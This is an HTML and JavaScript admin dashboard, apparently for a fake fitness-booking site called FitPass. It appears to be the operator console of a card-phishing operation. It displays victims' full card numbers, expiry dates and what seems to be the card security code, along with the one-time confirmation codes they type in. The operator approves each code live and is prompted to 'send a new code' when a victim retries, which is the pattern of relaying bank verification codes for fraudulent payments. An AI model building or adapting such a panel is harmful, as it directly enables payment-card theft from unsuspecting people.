<!doctype html>
<html lang="ru">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>FitPass — Админка</title>
<link rel="stylesheet" href="/style.css?v=6">
</head>
<body class="admin-theme">
<header class="top">
  <div class="admin-brand">FitPass <span>• Admin</span></div>
  <button id="logout" class="secondary hidden">Выйти</button>
</header>

<main class="admin">
  <section id="login" class="login card">
    <div class="admin-kicker">Панель менеджера</div>
    <h1>Вход в админ-панель</h1>
    <p class="muted">Здесь появляются бронирования и коды, введённые клиентами.</p>

    <label>Логин
      <input id="user" value="admin" autocomplete="username">
    </label>

    <label>Пароль
      <input id="pass" type="password" placeholder="Пароль" autocomplete="current-password">
    </label>

    <button id="loginBtn" class="primary-admin">Войти</button>
    <p id="loginErr" class="error"></p>
  </section>

  <section id="dashboard" class="hidden">
    <div class="dashhead">
      <div>
        <div class="admin-kicker">Рабочая область</div>
        <h1>Заявки</h1>
        <p class="muted">Клиент вводит код — менеджер видит его здесь и вручную принимает решение.</p>
      </div>
      <button id="refresh" class="secondary">Обновить</button>
    </div>

    <div class="stats">
      <div class="stat"><b id="all">0</b><span>Всего</span></div>
      <div class="stat"><b id="waiting">0</b><span>Ожидают ввода</span></div>
      <div class="stat"><b id="review">0</b><span>Ждут проверки</span></div>
      <div class="stat"><b id="retry">0</b><span>Нужен повтор</span></div>
      <div class="stat"><b id="confirmed">0</b><span>Подтверждено</span></div>
    </div>

    <div id="cards"></div>
  </section>
</main>

<script>
const $=id=>document.getElementById(id);
let pollTimer=null;

async function check(){
  const r=await fetch('/api/me');
  const d=await r.json();
  if(d.authenticated)showDash();
}
function showDash(){
  $('login').classList.add('hidden');
  $('dashboard').classList.remove('hidden');
  $('logout').classList.remove('hidden');
  load();
  if(!pollTimer)pollTimer=setInterval(load,1200);
}

$('loginBtn').onclick=async()=>{
  $('loginErr').textContent='';
  const btn=$('loginBtn');
  btn.disabled=true;
  btn.textContent='Входим…';
  try{
    const r=await fetch('/api/login',{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({username:$('user').value.trim(),password:$('pass').value})
    });
    const d=await r.json();
    if(r.ok){showDash();}
    else{$('loginErr').textContent=d.error||'Не удалось войти';btn.disabled=false;btn.textContent='Войти';}
  }catch(e){
    $('loginErr').textContent='Нет соединения с сервером. Убедитесь, что npm start запущен.';
    btn.disabled=false;
    btn.textContent='Войти';
  }
};

$('pass').addEventListener('keydown',e=>{if(e.key==='Enter')$('loginBtn').click()});
$('user').addEventListener('keydown',e=>{if(e.key==='Enter')$('loginBtn').click()});

async function load(){
  const r=await fetch('/api/leads');
  if(r.status===401)return;
  const a=await r.json();

  $('all').textContent=a.length;
  $('waiting').textContent=a.filter(x=>x.status==='Ожидает ввода кода'||x.status==='Клиент запросил новый код').length;
  $('review').textContent=a.filter(x=>x.status==='Ожидает решения менеджера').length;
  $('retry').textContent=a.filter(x=>x.status==='Код не подошёл — повторный ввод').length;
  $('confirmed').textContent=a.filter(x=>x.status==='Подтверждено').length;

  $('cards').innerHTML=a.length?a.map(card).join(''):'<div class="empty">Заявок пока нет.</div>';
}

function esc(s){return String(s??'').replace(/[&<>"']/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;'}[m]))}

function card(x){
  const review=x.status==='Ожидает решения менеджера';
  const retryRequested=x.status==='Клиент запросил новый код';

  const badgeClass=
    x.status==='Подтверждено'?'success':
    review?'review':
    x.status==='Код не подошёл — повторный ввод'?'retry':'waiting';

  let action='';
  if(review){
    action=`<button class="approve" onclick="decision(${x.id},'approve')">✓ Подходит код</button>
            <button class="reject" onclick="decision(${x.id},'reject')">✕ Не подходит</button>`;
  }

  const codeView=x.submitted_code
    ? `<strong class="entered-code">${esc(x.submitted_code)}</strong>`
    : x.rejected_code
      ? `<strong class="entered-code rejected-code">${esc(x.rejected_code)}</strong>`
      : `<span class="no-code">Клиент ещё не ввёл код</span>`;

  const retryNote=retryRequested
    ? `<div class="retry-notice">↻ Клиент нажал «Отправить код снова». Необходимо передать ему новый код.</div>`
    : '';

  return `<article class="leadcard ${review||retryRequested?'attention':''}">
    <div class="leadtop">
      <div>
        <div class="lead-name">${esc(x.name||"Не указан")}</div>
        <div class="lead-meta">${esc(x.created_at?new Date(x.created_at).toLocaleString('ru-RU'):'')}</div>
      </div>
      <span class="badge ${badgeClass}">${esc(x.status)}</span>
    </div>

    <div class="leadgrid">
      <div><b>Бронь</b><span>${esc(x.booking)}</span></div>
      <div><b>Карточка</b><span>${esc((x.card_number||'').replace(/(\d{4})(?=\d)/g,'$1 '))}</span></div>
      <div><b>Срок</b><span>${esc(x.expiry)}</span></div>
      <div><b>Внутренний код карточки</b><span>${esc(x.card_code)}</span></div>
    </div>

    ${retryNote}

    <div class="codebox ${review?'codebox-live':''}">
      <div>
        <b>${x.rejected_code && x.status==='Код не подошёл — повторный ввод' ? 'Последний введённый код (не подошёл)' : 'Код, который ввёл клиент'}</b>
        <span>${codeView}</span>
      </div>
      <div class="codeactions">${action}</div>
    </div>

    <div class="result"><b>Результат:</b>
      ${x.status==='Подтверждено'?'Код подтверждён менеджером ✓':
        x.status==='Код не подошёл — повторный ввод'?'Код не подошёл. Клиенту доступна кнопка повторного запроса.':
        x.status==='Клиент запросил новый код'?'Клиент запросил новый код — отправьте ему новый код.':
        review?'Клиент ввёл код — требуется решение менеджера.':
        'Ожидается ввод кода клиентом.'}
      ${x.attempts?` · Попыток: ${x.attempts}`:''}
      ${x.last_attempt_at?` · ${new Date(x.last_attempt_at).toLocaleString('ru-RU')}`:''}
    </div>

    <div class="cardactions">
      <button class="danger" onclick="removeLead(${x.id})">Удалить заявку</button>
    </div>
  </article>`;
}

async function decision(id,decision){
  const label=decision==='approve'?'подтвердить этот код':'отклонить этот код';
  if(!confirm('Вы уверены, что хотите '+label+'?'))return;
  await fetch('/api/leads/'+id+'/decision',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({decision})
  });
  load();
}

async function removeLead(id){
  if(!confirm('Удалить заявку?'))return;
  await fetch('/api/leads/'+id,{method:'DELETE'});
  load();
}

$('refresh').onclick=load;
$('logout').onclick=async()=>{
  await fetch('/api/logout',{method:'POST'});
  if(pollTimer)clearInterval(pollTimer);
  location.reload();
};
check();
</script>
</body>
</html>
